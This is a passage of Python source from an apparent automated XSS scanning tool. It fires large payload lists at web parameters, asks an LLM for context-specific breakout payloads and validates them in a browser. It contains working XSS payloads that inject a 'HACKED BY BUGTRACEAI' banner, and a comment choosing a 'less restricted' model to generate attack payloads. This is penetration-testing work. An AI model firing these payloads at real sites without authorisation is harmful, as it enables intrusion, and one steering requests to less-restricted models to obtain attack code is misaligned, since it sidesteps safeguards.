                # Complement: ask Vision AI to confirm the banner is visible in the
                # captured shot (records evidence.vision_confirmed as double proof).
                # Best-effort: a Vision failure never affects the already-confirmed
                # finding.
                if isinstance(finding_dict.get("evidence"), dict):
                    try:
                        await self._run_vision_validation(
                            str(path), exploit_url, visible_payload, finding_dict["evidence"]
                        )
                    except Exception as vis_err:
                        logger.debug(f"[{self.name}] proof-shot vision check skipped: {vis_err}")
        except Exception as e:
            logger.debug(f"[{self.name}] proof screenshot capture skipped: {e}")

    def _update_learned_breakouts(self, payload: str) -> None:
        """
        Update breakouts.json with successful payload patterns.

        Extracts the breakout prefix from a successful payload and
        increments its success_count for future prioritization.
        """
        try:
            if not self._payload_amplifier:
                return

            # Extract prefix by finding common breakout patterns
            for prefix in self._payload_amplifier.get_prefixes(category="xss"):
                if prefix and payload.startswith(prefix):
                    # Found the breakout used - would update success_count here
                    logger.debug(f"[{self.name}] Learned successful breakout: {prefix}")
                    self.payload_learner.record_success(payload, "xss")
                    break

        except Exception as e:
            logger.debug(f"[{self.name}] Failed to update learned breakouts: {e}")

    async def _run_hybrid_test_param(
        self,
        param: str,
        interactsh_domain: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Run the full 5-phase hybrid test on a single parameter.

        This is the main hybrid engine entry point that orchestrates
        all phases: Omniprobe → Seed → Amplify → Mass Attack → Validate.

        Args:
            param: Parameter to test
            interactsh_domain: Interactsh callback domain
            screenshots_dir: Directory for screenshots

        Returns:
            XSSFinding if XSS confirmed, None otherwise
        """
        interactsh_url = f"http://{interactsh_domain}" if interactsh_domain else ""

        # Probe and analyze context first (reuse existing logic)
        probe_data = await self._param_probe_and_setup(param)
        if not probe_data:
            return None

        html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, _ = probe_data

        # Skip if no reflection detected and not blocked
        if not context_data.get("reflected") and not context_data.get("is_blocked"):
            dashboard.log(f"[{self.name}] No reflection on '{param}', skipping hybrid", "INFO")
            return None

        # === PHASE 1: OMNIPROBE (Reconnaissance) ===
        # Purpose: Detect reflection points and what characters survive
        # Does NOT exploit - just gathers context for Phase 2
        omni_reflection = await self._hybrid_phase1_omniprobe(param, interactsh_url)
        if omni_reflection:
            # Log what we learned from the probe
            dashboard.log(
                f"[{self.name}] 🔍 Omniprobe results: context={omni_reflection.context}, "
                f"encoded={omni_reflection.encoded}, suspicious={omni_reflection.is_suspicious}",
                "INFO"
            )
            # Context info passed to Phase 2 via context_data (already available)

        # === PHASE 2: SEED GENERATION (LLM) ===
        seeds = await self._hybrid_phase2_seed_generation(
            param=param,
            html=html,
            context_data=context_data,
            interactsh_url=interactsh_url
        )

        if not seeds:
            dashboard.log(f"[{self.name}] No seeds generated, skipping amplification", "WARN")
            return None

        # === PHASE 3: AMPLIFICATION (Python) ===
        amplified_payloads = await self._hybrid_phase3_amplification(
            seeds=seeds,
            context_data=context_data
        )

        # === PHASE 4: MASS ATTACK (Go) ===
        fuzz_result = await self._hybrid_phase4_mass_attack(
            param=param,
            payloads=amplified_payloads
        )

        # === PHASE 4.5 ↔ 5 RETRY LOOP ===
        # If visual validation fails, retry Phase 4.5 with feedback about failed payloads
        # Max 3 attempts before falling back to regular candidates only
        max_visual_retries = 3
        failed_visual_payloads: List[str] = []
        finding = None

        for attempt in range(max_visual_retries):
            # === PHASE 4.5: VISUAL PAYLOAD GENERATION (DeepSeek) ===
            visual_payloads = await self._hybrid_phase45_visual_generation(
                param=param,
                fuzz_result=fuzz_result,
                failed_payloads=failed_visual_payloads  # Pass failed payloads to avoid
            )

            if not visual_payloads:
                dashboard.log(
                    f"[{self.name}] Phase 4.5: No visual payloads generated (attempt {attempt+1}/{max_visual_retries})",
                    "WARN"
                )
                break  # No point retrying if LLM can't generate payloads

            # === PHASE 5: VALIDATION (Python/Playwright) ===
            finding = await self._hybrid_phase5_validation(
                param=param,
                fuzz_result=fuzz_result,
                screenshots_dir=screenshots_dir,
                reflection_type=reflection_type,
                surviving_chars=surviving_chars,
                injection_ctx=injection_ctx,
                visual_payloads=visual_payloads
            )

            if finding:
                # Success! Visual payload worked
                return finding

            # Visual validation failed - add to failed list and retry
            failed_visual_payloads.extend(visual_payloads)
            dashboard.log(
                f"[{self.name}] Phase 5 failed, retrying Phase 4.5 (attempt {attempt+1}/{max_visual_retries})",
                "WARN"
            )

        # All visual attempts failed - try regular candidates one last time
        if not finding:
            dashboard.log(
                f"[{self.name}] All visual retries exhausted, final attempt with regular candidates",
                "WARN"
            )
            finding = await self._hybrid_phase5_validation(
                param=param,
                fuzz_result=fuzz_result,
                screenshots_dir=screenshots_dir,
                reflection_type=reflection_type,
                surviving_chars=surviving_chars,
                injection_ctx=injection_ctx,
                visual_payloads=[]  # No visual payloads, only regular candidates
            )

        return finding

    async def _hybrid_phase45_visual_generation(
        self,
        param: str,
        fuzz_result: "FuzzResult",
        failed_payloads: List[str] = None
    ) -> List[str]:
        """
        Phase 4.5: Generate visual payloads from WORKING payloads.

        SMART APPROACH: Instead of generating generic visual payloads,
        we take the payloads that ACTUALLY WORKED (reflected) and ask
        DeepSeek to adapt them to show the HACKED BY BUGTRACEAI banner.

        Flow:
        1. Get working payloads from fuzz results
        2. Ask LLM: "These payloads WORK, adapt them to show the banner"
        3. This is smarter because the breakout pattern is already proven

        Args:
            param: Parameter name
            fuzz_result: Results from Go fuzzer with reflection contexts
            failed_payloads: Payloads that failed in previous attempts (to avoid)

        Returns:
            List of visual payloads based on WORKING payloads
        """
        if failed_payloads is None:
            failed_payloads = []

        if not fuzz_result.reflections:
            return []

        # Get the TOP WORKING payloads (the ones that actually reflected)
        working_payloads = []
        seen = set()
        for ref in fuzz_result.reflections[:10]:  # Top 10 working payloads
            if ref.payload and ref.payload not in seen:
                working_payloads.append({
                    "payload": ref.payload,
                    "context": ref.context or "unknown"
                })
                seen.add(ref.payload)

        if not working_payloads:
            return []

        retry_info = f" (retry, avoiding {len(failed_payloads)} failed)" if failed_payloads else ""
        dashboard.log(
            f"[{self.name}] 🎨 Phase 4.5: Found {len(working_payloads)} WORKING payloads, asking LLM for visual versions{retry_info}",
            "INFO"
        )

        # Ask DeepSeek to adapt the WORKING payloads to include the visual banner
        visual_payloads = await self._adapt_working_payloads_to_visual(working_payloads, failed_payloads)

        if visual_payloads:
            dashboard.log(
                f"[{self.name}] 🎯 Generated {len(visual_payloads)} visual payloads from working payloads",
                "SUCCESS"
            )

        return visual_payloads

    async def _adapt_working_payloads_to_visual(
        self,
        working_payloads: List[Dict[str, str]],
        failed_payloads: List[str] = None
    ) -> List[str]:
        """
        Ask LLM to adapt WORKING payloads to include the visual banner.

        This is smarter than generating generic payloads because:
        - We KNOW the breakout pattern works (it reflected)
        - We just need to add the visual component

        Args:
            working_payloads: List of dicts with 'payload' and 'context'
            failed_payloads: Payloads that already failed (to avoid regenerating)

        Returns:
            List of visual payloads
        """
        from bugtrace.core.llm_client import llm_client

        if failed_payloads is None:
            failed_payloads = []

        # Format working payloads for the prompt
        payloads_str = "\n".join([
            f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
            for p in working_payloads[:5]
        ])

        # Add failed payloads warning if retrying
        failed_warning = ""
        if failed_payloads:
            failed_samples = "\n".join([f"- {p[:80]}..." for p in failed_payloads[:5]])
            failed_warning = f"""

IMPORTANT: These payloads ALREADY FAILED validation. Generate DIFFERENT ones:
{failed_samples}

Try different approaches:
- Different DOM manipulation methods (createElement vs innerHTML vs insertAdjacentHTML)
- Different event handlers (onerror, onload, onfocus)
- Different element types (div, img, svg, iframe)
- Different string concatenation techniques
"""

        prompt = f"""You are an XSS expert. These payloads SUCCESSFULLY REFLECTED on the target:

{payloads_str}

Your task: Adapt each working payload to ALSO inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI".

RULES:
1. Keep the same breakout technique that made the payload work
2. Add code to create a visible red div with the text
3. Use BACKTICKS (`) for strings to avoid escaping issues
4. The banner style: position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999

Example transformations:
- If payload is: \\';alert(1)//
  Visual version: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//

- If payload is: "><script>alert(1)</script>
  Visual version: "><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div><script>

Generate 10 visual versions of the working payloads. Return ONLY the payloads, one per line, no explanations.{failed_warning}"""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS-AdaptVisual",
                model_override=settings.MUTATION_MODEL,
                temperature=0.7,
                max_tokens=2000
            )

            if not response:
                # Fallback to prebuilt payloads
                return self._build_visual_payloads_from_breakouts()

            # Parse payloads
            payloads = []
            failed_set = set(failed_payloads) if failed_payloads else set()
            for line in response.strip().split("\n"):
                line = line.strip()
                if line and not line.startswith("#") and len(line) > 10:
                    if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                        line = line[2:].strip()
                    # Skip payloads that already failed
                    if line not in failed_set:
                        payloads.append(line)

            # If LLM returned good payloads, use them; otherwise fallback
            if len(payloads) >= 3:
                return payloads[:10]
            else:
                logger.warning(f"[{self.name}] LLM returned few payloads, adding prebuilt fallback")
                fallback = [p for p in self._build_visual_payloads_from_breakouts() if p not in failed_set]
                return payloads + fallback

        except Exception as e:
            logger.warning(f"[{self.name}] Failed to adapt payloads: {e}, using prebuilt")
            return self._build_visual_payloads_from_breakouts()

    def _build_visual_payloads_from_breakouts(self) -> List[str]:
        """
        Build visual payloads dynamically from breakouts.json.

        This combines XSS breakout prefixes with visual payload templates
        to create payloads that inject the HACKED BY BUGTRACEAI banner.

        Returns:
            List of visual payloads built from breakouts.json prefixes
        """
        # Visual payload templates (without breakout prefix)
        # Template with backticks (for JS contexts where quotes are escaped)
        JS_VISUAL_BACKTICK = "var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"

        # Template with single quotes (standard JS)
        JS_VISUAL_SINGLE = "var d=document.createElement('div');d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//"

        # HTML template (for attribute/tag breakouts)
        HTML_VISUAL = "<div style=\"position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999\">HACKED BY BUGTRACEAI</div>"

        visual_payloads = []

        # Get XSS breakout prefixes from PayloadAmplifier (uses breakouts.json)
        if self._payload_amplifier:
            prefixes = self._payload_amplifier.get_prefixes(category="xss", max_priority=2)
        else:
            # Fallback if amplifier not initialized
            prefixes = ["'", "\"", "\\';", "\\\";", "';", "\";", "'>", "\">"]

        # Build payloads for each prefix
        for prefix in prefixes[:15]:  # Limit to top 15 prefixes
            # Determine which template to use based on prefix
            if prefix.startswith("\\"):
                # Backslash breakouts work best with backticks
                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
            elif prefix.endswith(">"):
                # Tag breakouts use HTML template
                visual_payloads.append(f"{prefix}{HTML_VISUAL}<input value=\"")
            elif prefix in ("'", "';", "'//"):
                # Single quote breakouts
                visual_payloads.append(f"{prefix}{JS_VISUAL_SINGLE}")
            elif prefix in ("\"", "\";", "\"//"):
                # Double quote breakouts use backticks to avoid escaping issues
                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")
            else:
                # Default: try backtick version
                visual_payloads.append(f"{prefix}{JS_VISUAL_BACKTICK}")

        logger.debug(f"[{self.name}] Built {len(visual_payloads)} visual payloads from breakouts.json")
        return visual_payloads

    async def _ask_deepseek_visual_payloads(
        self,
        param: str,
        contexts: List[str],
        sample_payloads: Dict[str, str],
        html_snippet: str = ""
    ) -> List[str]:
        """
        Ask DeepSeek to generate payloads that inject visible HACKED BY BUGTRACEAI banner.

        Args:
            param: Parameter name
            contexts: List of reflection contexts found (e.g., ["html_text", "attribute_value"])
            sample_payloads: Example payloads that reflected per context
            html_snippet: Actual HTML around the reflection point for context-aware generation

        Returns:
            List of 10 visual payloads
        """
        from bugtrace.core.llm_client import llm_client

        contexts_str = ", ".join(contexts)
        samples_str = "\n".join([f"- {ctx}: {p[:80]}..." for ctx, p in sample_payloads.items()])

        # Build context-aware prompt section
        snippet_section = ""
        if html_snippet:
            snippet_section = f"""
ACTUAL HTML WHERE THE PARAMETER REFLECTS:
```
{html_snippet[:500]}
```
Analyze this code carefully. Identify:
- What quote type wraps the reflection (single, double, backtick)
- What escaping the server applies (backslash doubling, HTML encoding)
- The exact breakout sequence needed to escape THIS specific context
Generate payloads that exploit THIS specific reflection, not generic payloads.
"""

        prompt = f"""You are an XSS payload expert. I found reflections in these contexts: {contexts_str}

Sample payloads that reflected:
{samples_str}
{snippet_section}
Generate exactly 10 XSS payloads that will:
1. Break out of the current context
2. Inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"

CRITICAL RULES FOR JAVASCRIPT CONTEXTS:
- If context is javascript_string or script, quotes are often escaped (\\' or \\")
- Use BACKTICKS (`) instead of quotes for all string literals inside the payload
- Use \\'; or \\"; to break out of strings with backslash escaping
- If the server escapes \\ to \\\\ but does NOT escape single quotes, use \\'; to break out
- Example working payload: \\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//

FOR HTML CONTEXTS, use this pattern:
<div id="bt-pwn" style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>

Return ONLY the payloads, one per line, no explanations, no numbering.
Each payload should target a different context or use a different breakout technique."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS-VisualGen",
                model_override=settings.MUTATION_MODEL,  # DeepSeek - less restricted
                temperature=0.7,
                max_tokens=2000
            )

            if not response:
                return []

            # Parse payloads from response
            payloads = []
            for line in response.strip().split("\n"):
                line = line.strip()
                # Skip empty lines and explanations
                if not line or line.startswith("#") or line.startswith("//"):
                    continue
                # Remove numbering like "1." or "1)"
                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                    line = line[2:].strip()
                if line and len(line) > 10:  # Minimum payload length
                    payloads.append(line)

            return payloads[:10]  # Max 10 payloads

        except Exception as e:
            logger.warning(f"[{self.name}] Visual payload generation failed: {e}")
            return []

    # =========================================================================
    # END HYBRID ENGINE
    # =========================================================================

    # =========================================================================
    # PIPELINE V2: BOMBARDEO PRIMERO, ANÁLISIS DESPUÉS
    #
    # Philosophy: Fire ALL payloads at once, then analyze what reflected.
    # This is faster and more efficient than the old probe-first approach.
    #
    # Flow:
    #   Phase 1: BOMBARDEO TOTAL (Go fuzzer fires all payloads)
    #   Phase 2: ANÁLISIS (analyze reflections, context, escaping)
    #   Phase 3.1: LLM Visual Generation (~100 payloads with "HACKED BY BUGTRACEAI")
    #   Phase 3.2: Amplification (multiply by breakouts.json)
    #   Phase 3.3: Second Bombardment (Go fuzzer with amplified payloads)
    #   Phase 4: Validation (conditional Playwright - skip if already confirmed)
    #
    # Output files (for pentester audit trail):
    #   - phase1_bombardment.md
    #   - phase2_analysis.md
    #   - phase3_amplified.md
    #   - phase4_results.md
    # =========================================================================

    async def _run_pipeline_v2(
        self,
        param: str,
        interactsh_domain: str,
        screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Main orchestrator for Pipeline V2: Bombardment-First approach.

        Args:
            param: Parameter to test
            interactsh_domain: Interactsh callback domain
            screenshots_dir: Directory for screenshots

        Returns:
            XSSFinding if XSS confirmed, None otherwise
        """
        interactsh_url = f"http://{interactsh_domain}" if interactsh_domain else ""

        # Create XSS report directory
        xss_report_dir = self.report_dir / "specialists" / "xss"
        xss_report_dir.mkdir(parents=True, exist_ok=True)

        dashboard.log(f"[{self.name}] 🚀 Pipeline V2: Starting bombardment-first approach on '{param}'", "INFO")

        # =====================================================================
        # PHASE 1: BOMBARDEO TOTAL
        # Fire ALL payloads at once - curated + proven + golden
        # =====================================================================
        phase1_result = await self._pipeline_v2_phase1_bombardment(
            param=param,
            interactsh_url=interactsh_url,
            report_dir=xss_report_dir
        )

        if not phase1_result:
            dashboard.log(f"[{self.name}] Phase 1 failed or no reflections", "WARN")
            return None

        fuzz_result, payloads_sent = phase1_result

        # =====================================================================
        # PHASE 2: ANÁLISIS
        # Analyze what reflected, in what context, what escaping applied
        # =====================================================================
        analysis = await self._pipeline_v2_phase2_analysis(
            fuzz_result=fuzz_result,
            report_dir=xss_report_dir
        )

        # Check if Interactsh confirmed (100% confidence - skip to Phase 4)
        if analysis.get("interactsh_confirmed"):
            dashboard.log(f"[{self.name}] 🎯 Interactsh callback received! XSS CONFIRMED.", "SUCCESS")
            finding = self._create_finding_from_interactsh(
                param=param,
                payload=analysis["confirmed_payload"],
                evidence=analysis["evidence"],
                screenshots_dir=screenshots_dir
            )
            self._save_phase4_report(xss_report_dir, finding, "interactsh")
            return finding

        # If no reflections at all, abort
        if not analysis.get("reflections"):
            dashboard.log(f"[{self.name}] Phase 2: No reflections found, aborting", "WARN")
            return None

        # =====================================================================
        # PHASE 3.1: LLM VISUAL GENERATION
        # Generate ~100 payloads with "HACKED BY BUGTRACEAI" based on reflections
        # =====================================================================
        visual_payloads = await self._pipeline_v2_phase3_llm_visual(
            reflections=analysis["reflections"],
            contexts=analysis["contexts"],
            escaping=analysis["escaping"]
        )

        # =====================================================================
        # PHASE 3.2: AMPLIFICATION
        # Multiply visual payloads by breakouts.json prefixes
        # =====================================================================
        amplified_payloads = self._pipeline_v2_phase3_amplify(
            visual_payloads=visual_payloads,
            contexts=analysis["contexts"]
        )

        # =====================================================================
        # PHASE 3.3: SECOND BOMBARDMENT
        # Fire amplified payloads with Go fuzzer
        # =====================================================================
        phase3_result = await self._pipeline_v2_phase3_attack(
            param=param,
            payloads=amplified_payloads,
            report_dir=xss_report_dir
        )

        # =====================================================================
        # PHASE 4: VALIDATION
        # Conditional Playwright - skip if high confidence from HTTP
        # =====================================================================
        finding = await self._pipeline_v2_phase4_validation(
            param=param,
            phase1_result=fuzz_result,
            phase3_result=phase3_result,
            analysis=analysis,
            screenshots_dir=screenshots_dir,
            report_dir=xss_report_dir
        )

        return finding

    async def _pipeline_v2_phase1_bombardment(
        self,
        param: str,
        interactsh_url: str,
        report_dir: Path
    ) -> Optional[Tuple["FuzzResult", List[str]]]:
        """
        Phase 1: BOMBARDEO TOTAL - Fire ALL payloads at once.

        Combines:
        - OMNIPROBE_PAYLOAD (for context detection)
        - curated_list (highest priority)
        - proven_payloads (dynamic memory)
        - GOLDEN_PAYLOADS (defaults)

        Args:
            param: Parameter to fuzz
            interactsh_url: Interactsh callback URL for OOB detection
            report_dir: Directory to save phase report

        Returns:
            Tuple of (FuzzResult, list of payloads sent)
        """
        dashboard.log(f"[{self.name}] ⚡ Phase 1: BOMBARDEO TOTAL on '{param}'", "INFO")
        dashboard.set_status("XSS Phase 1", f"Bombarding {param}")

        # Build mega payload list
        all_payloads = []
        seen = set()

        # 1. OMNIPROBE first (for context detection)
        all_payloads.append(self.OMNIPROBE_PAYLOAD)
        seen.add(self.OMNIPROBE_PAYLOAD)

        # 2. Curated list (highest priority) - use PayloadLearner
        prioritized = self.payload_learner.get_prioritized_payloads(
            default_list=self.GOLDEN_PAYLOADS
        )

        for p in prioritized:
            # Replace Interactsh placeholder
            payload = p.replace("{{interactsh_url}}", interactsh_url) if interactsh_url else p
            if payload not in seen:
                all_payloads.append(payload)
                seen.add(payload)

        # 3. Fragment payloads for DOM XSS
        for fp in self.FRAGMENT_PAYLOADS:
            payload = fp.replace("{{interactsh_url}}", interactsh_url) if interactsh_url else fp
            if payload not in seen:
                all_payloads.append(payload)
                seen.add(payload)

        dashboard.log(f"[{self.name}] 📦 Phase 1: {len(all_payloads)} payloads ready to fire", "INFO")

        # Fire using Go fuzzer
        if not self._go_bridge:
            await self._init_hybrid_engine()

        if not self._go_bridge:
            logger.error(f"[{self.name}] Go bridge unavailable, cannot run Phase 1")
            return None

        result = await self._go_bridge.run(
            url=self.url,
            param=param,
            payloads=all_payloads
        )

        # Save phase report
        self._save_phase1_report(report_dir, param, all_payloads, result)

        dashboard.log(
            f"[{self.name}] 📊 Phase 1 complete: {result.total_requests} requests, "
            f"{len(result.reflections)} reflections @ {result.requests_per_second:.1f} req/s",
            "INFO"
        )

        return (result, all_payloads)

    async def _pipeline_v2_phase2_analysis(
        self,
        fuzz_result: "FuzzResult",
        report_dir: Path
    ) -> Dict[str, Any]:
        """
        Phase 2: ANÁLISIS - Analyze all responses from Phase 1.

        Determines:
        - Which payloads reflected
        - In what context (JS string, HTML attr, etc.)
        - What escaping the server applied
        - If Interactsh callback was received

        Args:
            fuzz_result: Results from Phase 1 bombardment
            report_dir: Directory to save phase report

        Returns:
            Analysis dict with reflections, contexts, escaping, and confirmation status
        """
        dashboard.log(f"[{self.name}] 🔍 Phase 2: Analyzing {len(fuzz_result.reflections)} reflections", "INFO")
        dashboard.set_status("XSS Phase 2", "Analyzing responses")

        analysis = {
            "reflections": [],
            "contexts": set(),
            "escaping": {},
            "interactsh_confirmed": False,
            "confirmed_payload": None,
            "evidence": {},
            "high_confidence_candidates": []
        }

        # Check Interactsh for callbacks
        if self.interactsh:
            try:
                interactions = await self.interactsh.poll()
                if interactions:
                    analysis["interactsh_confirmed"] = True
                    # Find the payload that triggered the callback
                    for ref in fuzz_result.reflections:
                        if "interactsh" in ref.payload.lower() or self.interactsh.domain in ref.payload:
                            analysis["confirmed_payload"] = ref.payload
                            break
                    analysis["evidence"] = {
                        "method": "Interactsh OOB Callback",
                        "interactions": len(interactions),
                        "confidence": 1.0
                    }
                    dashboard.log(f"[{self.name}] 🎯 Interactsh confirmed XSS!", "SUCCESS")
            except Exception as e:
                logger.debug(f"Interactsh poll error: {e}")

        # Analyze each reflection
        for ref in fuzz_result.reflections:
            reflection_data = {
                "payload": ref.payload,
                "context": ref.context,
                "encoded": ref.encoded,
                "encoding_type": ref.encoding_type,
                "status_code": ref.status_code,
                "is_suspicious": ref.is_suspicious
            }
            analysis["reflections"].append(reflection_data)
            analysis["contexts"].add(ref.context)

            # Track escaping per context
            if ref.encoded:
                if ref.context not in analysis["escaping"]:
                    analysis["escaping"][ref.context] = []
                analysis["escaping"][ref.context].append(ref.encoding_type)

            # High confidence candidates (unencoded in dangerous context)
            if ref.is_suspicious:
                analysis["high_confidence_candidates"].append(ref)

        analysis["contexts"] = list(analysis["contexts"])

        # Save phase report
        self._save_phase2_report(report_dir, analysis)

        dashboard.log(
            f"[{self.name}] 📊 Phase 2 complete: {len(analysis['reflections'])} reflections, "
            f"contexts={analysis['contexts']}, high_conf={len(analysis['high_confidence_candidates'])}",
            "INFO"
        )

        return analysis

    async def _pipeline_v2_phase3_llm_visual(
        self,
        reflections: List[Dict],
        contexts: List[str],
        escaping: Dict[str, List[str]]
    ) -> List[str]:
        """
        Phase 3.1: LLM Visual Generation - Generate ~100 payloads with banner.

        Takes the payloads that REFLECTED and asks LLM to create versions
        that display "HACKED BY BUGTRACEAI" banner.

        Args:
            reflections: List of reflection data from Phase 2
            contexts: List of detected contexts
            escaping: Escaping info per context

        Returns:
            List of ~100 visual payloads
        """
        dashboard.log(f"[{self.name}] 🎨 Phase 3.1: Generating visual payloads via LLM", "INFO")
        dashboard.set_status("XSS Phase 3.1", "LLM visual generation")

        # Get top reflections to use as seeds
        working_payloads = []
        for ref in reflections[:20]:  # Top 20 that reflected
            working_payloads.append({
                "payload": ref["payload"],
                "context": ref["context"]
            })

        if not working_payloads:
            # Fallback: use GOLDEN_PAYLOADS if nothing reflected
            dashboard.log(f"[{self.name}] No reflections, using GOLDEN_PAYLOADS as seeds", "WARN")
            working_payloads = [{"payload": p, "context": "unknown"} for p in self.GOLDEN_PAYLOADS[:10]]

        # Format for LLM
        payloads_str = "\n".join([
            f"- Payload: {p['payload'][:100]}... (context: {p['context']})"
            for p in working_payloads[:10]
        ])

        contexts_str = ", ".join(contexts) if contexts else "unknown"
        escaping_str = json.dumps(escaping, indent=2) if escaping else "none detected"

        prompt = f"""You are an elite XSS expert. These payloads REFLECTED on the target:

{payloads_str}

Detected contexts: {contexts_str}
Server escaping behavior: {escaping_str}

YOUR MISSION: Generate 100 XSS payloads that will inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI".

CRITICAL RULES:
1. Keep the breakout technique that made the original payload reflect
2. Use BACKTICKS (`) for strings to avoid escaping issues
3. The banner MUST be visible at top of page with this style:
   position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999

4. VARY your approaches:
   - Different DOM manipulation (createElement, innerHTML, insertAdjacentHTML)
   - Different event handlers (onerror, onload, onfocus, ontoggle)
   - Different elements (div, img, svg, iframe, details)
   - Different quote styles (`, ', ")
   - Different breakout prefixes (\\', \\", '>, ">, </script>)

EXAMPLE PAYLOADS:
\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//
"><div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999">HACKED BY BUGTRACEAI</div>
<svg onload="var d=document.createElement('div');d.id='bt-pwn';d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)">

Return EXACTLY 100 payloads, one per line, no explanations, no numbering."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="XSS-VisualGen-V2",
                model_override=settings.MUTATION_MODEL,
                temperature=0.8,  # Higher for variety
                max_tokens=8000   # Need space for 100 payloads
            )

            if not response:
                return self._fallback_visual_payloads()

            # Parse payloads
            visual_payloads = []
            for line in response.strip().split("\n"):
                line = line.strip()
                if not line or line.startswith("#") or line.startswith("//"):
                    continue
                # Remove numbering
                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                    line = line[2:].strip()
                if line and len(line) > 15:
                    visual_payloads.append(line)

            dashboard.log(f"[{self.name}] 🎯 Phase 3.1: Generated {len(visual_payloads)} visual payloads", "SUCCESS")

            # Ensure we have at least some payloads
            if len(visual_payloads) < 20:
                visual_payloads.extend(self._fallback_visual_payloads())

            return visual_payloads[:100]  # Cap at 100

        except Exception as e:
            logger.warning(f"[{self.name}] Phase 3.1 LLM failed: {e}, using fallback")
            return self._fallback_visual_payloads()

    def _fallback_visual_payloads(self) -> List[str]:
        """Generate fallback visual payloads if LLM fails."""
        JS_VISUAL = "var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"
        HTML_VISUAL = '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;z-index:99999">HACKED BY BUGTRACEAI</div>'

        # JS_VISUAL with single quotes instead of backticks for event handlers
        JS_VISUAL_SQ = JS_VISUAL.replace('`', "'")

        fallback = [
            f"\\';{JS_VISUAL}",
            f"\\\";{JS_VISUAL}",
            f"';{JS_VISUAL}",
            f"\";{JS_VISUAL}",
            f"\">{HTML_VISUAL}",
            f"'>{HTML_VISUAL}",
            f"</script>{HTML_VISUAL}<script>",
            f'<svg onload="{JS_VISUAL_SQ}">',
            f'<img src=x onerror="{JS_VISUAL_SQ}">',
            f'<details open ontoggle="{JS_VISUAL_SQ}">',
        ]
        return fallback

    def _pipeline_v2_phase3_amplify(
        self,
        visual_payloads: List[str],
        contexts: List[str]
    ) -> List[str]:
        """
        Phase 3.2: AMPLIFICATION - Multiply visual payloads by breakouts.json.

        Takes ~100 visual payloads and multiplies by breakout prefixes.
        100 payloads × 13 prefixes = ~1300 payloads

        Args:
            visual_payloads: List of visual payloads from Phase 3.1
            contexts: Detected contexts (affects which breakouts to use)

        Returns:
            Amplified list of payloads
        """
        dashboard.log(f"[{self.name}] 🔄 Phase 3.2: Amplifying {len(visual_payloads)} payloads", "INFO")
        dashboard.set_status("XSS Phase 3.2", "Amplification")

        if not self._payload_amplifier:
            self._payload_amplifier = PayloadAmplifier()

        # Determine priority based on contexts
        max_priority = 2 if any(c in ("javascript", "script", "attribute_value") for c in contexts) else 3

        amplified = self._payload_amplifier.amplify(
            seed_payloads=visual_payloads,
            category="xss",
            max_priority=max_priority,
            deduplicate=True
        )

        dashboard.log(
            f"[{self.name}] 📈 Phase 3.2: {len(visual_payloads)} → {len(amplified)} payloads "
            f"(×{len(amplified) // max(len(visual_payloads), 1)} expansion)",
            "SUCCESS"
        )

        return amplified

    async def _pipeline_v2_phase3_attack(
        self,
        param: str,
        payloads: List[str],
        report_dir: Path
    ) -> "FuzzResult":
        """
        Phase 3.3: SECOND BOMBARDMENT - Fire amplified payloads.

        Uses Go fuzzer for high-speed payload testing.

        Args:
            param: Parameter to fuzz
            payloads: Amplified payload list
            report_dir: Directory to save phase report

        Returns:
            FuzzResult with reflections
        """
        dashboard.log(f"[{self.name}] 🚀 Phase 3.3: Second bombardment ({len(payloads)} payloads)", "INFO")
